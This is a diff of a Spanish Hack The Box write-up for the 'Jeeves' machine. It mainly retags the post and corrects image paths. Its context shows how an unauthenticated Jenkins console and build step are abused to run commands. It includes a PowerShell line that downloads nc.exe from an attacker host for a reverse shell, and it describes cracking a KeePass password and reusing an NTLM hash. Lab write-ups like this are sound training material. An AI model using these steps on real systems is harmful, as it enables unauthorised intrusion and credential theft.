@@ -10,12 +10,12 @@ header:
   icon: /assets/images/hackthebox.webp
 categories:
   - Hackthebox
-  - Active Directory
+  - Web Pentesting
 tags:  
-  - certipy 
-  - MSSQL
-  - SMB
-  - ESC1
+  - Jenkins
+  - Keepass
+  - SeImpersonatePrivilege
+
 
 ---
 <style>
@@ -167,13 +167,13 @@ Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 La pagina web de la pagina es la siguiente:
 
-![](/assets/imaiges/htb-writeup-jeeves/ask.png)
+![](/assets/images/htb-writeup-jeeves/ask.png)
 
 Parece ser que se trata de un servidor jenkins. Al realizar la enumeración del portal, incluyendo el escaneo de archivos, directorios y la búsqueda de posibles vectores de ataque, no encontré ningún elemento que resultara útil o relevante para avanzar.
 
 Revisando el puerto 50000 me encontré lo siguiente:
 
-![](/assets/imaiges/htb-writeup-jeeves/404.png)
+![](/assets/images/htb-writeup-jeeves/404.png)
 
 Posteriormente, realice una enumeración de archivos y directorios con gobuster donde encontré la ruta `askjeeves` 
 
@@ -201,19 +201,19 @@ Starting gobuster in directory enumeration mode
 
 Al consultar la ruta me encontré con el servidor jenkins
 
-![](/assets/imaiges/htb-writeup-jeeves/wel.png)
+![](/assets/images/htb-writeup-jeeves/wel.png)
 
 Intente probar credenciales débiles o por defecto pero no pude ingresar al portal 
 
-![](/assets/imaiges/htb-writeup-jeeves/inva.png)
+![](/assets/images/htb-writeup-jeeves/inva.png)
 
 También intente buscar exploits para esta versión de Jenkins `2.87` pero no encontré ninguna que pueda darme un acceso inicial, algo interesante es que tiene habilitado la opción `Manage Jenkins` también consultado la ruta `script` puedo ejecutar comandos utilizando groovy 
 
-![](/assets/imaiges/htb-writeup-jeeves/scri.png)
+![](/assets/images/htb-writeup-jeeves/scri.png)
 
 Una vez que tengo una vía para ejecutar comandos puedo compartirme netcat.exe y enviare una reverse shell a mi equipo, primero creare una carpeta compartida por smb con impacket y llamare a netcat para generar a reverse shell
 
-![](/assets/imaiges/htb-writeup-jeeves/impa.png)
+![](/assets/images/htb-writeup-jeeves/impa.png)
 
 La ejecución fallo debido al carácter \ que parece interpretarlo como si quisiera escapara el carácter siguiente, para arreglarlo simplemente agregar una barra invertida mas para de esta manera decirle que el carácter que quiero ejecutar es la barra invertida y no estoy tratando de escapar nada.
 
@@ -279,40 +279,40 @@ C:\Users\Administrator\.jenkins>
 
 Otra forma de lograr la ejecución de comandos es creando un nuevo trabajo (Freestyle project)
 
-![](/assets/imaiges/htb-writeup-jeeves/free.png)
+![](/assets/images/htb-writeup-jeeves/free.png)
 
 En la sección `build` donde se configura el proyecto hay una sección que permite ejecutar comandos de Windows por lotes
 
-![](/assets/imaiges/htb-writeup-jeeves/build.png)
+![](/assets/images/htb-writeup-jeeves/build.png)
 
 Probé ejecutando el comando dir y funciono con éxito
 
-![](/assets/imaiges/htb-writeup-jeeves/dir.png)
+![](/assets/images/htb-writeup-jeeves/dir.png)
 
 Para ejecutar el proyecto debe seleccionarse la opción `Build Now`
 
-![](/assets/imaiges/htb-writeup-jeeves/buildn.png)
+![](/assets/images/htb-writeup-jeeves/buildn.png)
 
 Esto genera un valor en`Build Histroy` al consultarlo y seleccionar la opción `Console output`se puede ver el resultado del comando ejecutado (El color azul indica que la ejecución fue exitosa en caso de tener u color rojo indica que se presento un error)
 
-![](/assets/imaiges/htb-writeup-jeeves/buildh.png)
+![](/assets/images/htb-writeup-jeeves/buildh.png)
 
-![](/assets/imaiges/htb-writeup-jeeves/console.png)
+![](/assets/images/htb-writeup-jeeves/console.png)
 
-![](/assets/imaiges/htb-writeup-jeeves/output.png)
+![](/assets/images/htb-writeup-jeeves/output.png)
 
 Una vez que vi que tengo esta vía para ejecutar comandos le cargue `netcat.exe` al servidor seleccionando la opción `configure` para modificar los comandos, probé con IEX, iwr y curl pero obtenía el error `'iwr' is not recognized as an internal or external command, operable program or batch file`
 
-![](/assets/imaiges/htb-writeup-jeeves/iwr.png)
+![](/assets/images/htb-writeup-jeeves/iwr.png)
 
-![](/assets/imaiges/htb-writeup-jeeves/fail.png)
+![](/assets/images/htb-writeup-jeeves/fail.png)
 
 para poder lograr la ejecución de los comandos utilice la sig. sintaxis: 
 
 ```bash
 powershell -Command "iwr http://10.10.16.3/nc.exe -outf .\nc.exe"
 ```
-![](/assets/imaiges/htb-writeup-jeeves/pe.png)
+![](/assets/images/htb-writeup-jeeves/pe.png)
 
 ```bash
 ┌──(root㉿kali)-[/opt]
@@ -386,7 +386,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Posteriormente lo abrí con `keepassxc` sin embargo pide la contraseña maestra 
 
-![](/assets/imaiges/htb-writeup-jeeves/kee.png)
+![](/assets/images/htb-writeup-jeeves/kee.png)
 
 n este punto use `keepass2john` para poder obtener un hash y usar john para romperlo y encontrar la contraseña maestra 
 
@@ -411,7 +411,7 @@ Session completed.
 ```
 Finalmente ingrese la contraseña y pude acceder sin problemas
 
-![](/assets/imaiges/htb-writeup-jeeves/passk.png)
+![](/assets/images/htb-writeup-jeeves/passk.png)
 
 Revisando la contraseña de Backup stuff veo que se trata de un hash NTLM valide si correspondía al usuario administrador con nxc y marco un pwned 
 
